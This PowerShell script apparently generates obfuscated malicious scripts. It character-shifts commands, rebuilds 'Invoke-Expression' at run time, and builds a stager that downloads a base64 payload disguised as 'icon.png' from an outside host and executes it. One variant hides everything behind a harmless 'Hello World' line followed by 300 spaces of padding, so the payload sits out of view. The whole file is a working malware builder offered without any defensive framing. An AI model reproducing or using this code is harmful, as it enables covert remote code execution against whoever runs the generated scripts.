function pack() {
    $i=1
    $ofs=''
    [string[]] $($args[0] | % {$a=[char[]]$_ | % {$([char]([int]$_+$i))}; "$a";$i++})
}

function serialize() {
    $ofs=','
    return '$({0})' -f (([string[]]$args[0]) | % {"'$_'"})
    
}

function serialize_var() {
    param($name, $content)

    $ofs=''
    $out='$' + $name + ' = $('
    foreach($item in $content) {
        $out +="'$item',"
    }
    $out +="'');"
    $out
}

function gen_obfusrun($cmd) {
    $out = serialize_var d $(pack $cmd.Split(' '))
    $out += ';$c = $(u {0}).Trim();' -f $(serialize $(pack $("Invoke-Expression")))
    $out += '&$c $(u $d);'
    $out
}

function gen_dload() {
    gen_obfusrun 'Invoke-Expression $([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest "https://trnila.eu/pvbs/icon.png" -UseBasicParsing).Content)));'
}

function prepare_1() {
    $out = ""
    $out += "Write-Output 'Hello World';"
    $out += ' ' * 300
    $out += $(cat unpack.ps1) -join ''
    $out += serialize_var i $(pack $(cat init.ps1).Split(' '))
    $out += '$c = $(u {0}).Trim();' -f $(serialize $(pack $("Invoke-Expression")))
    $out += '&$c $(u $i);'
    $out += gen_dload
    $out
}

function prepare_2() {
    cat unpack.ps1
    cat init.ps1
    gen_dload
}

prepare_1 > gen/1.ps1
prepare_2 > gen/2.ps1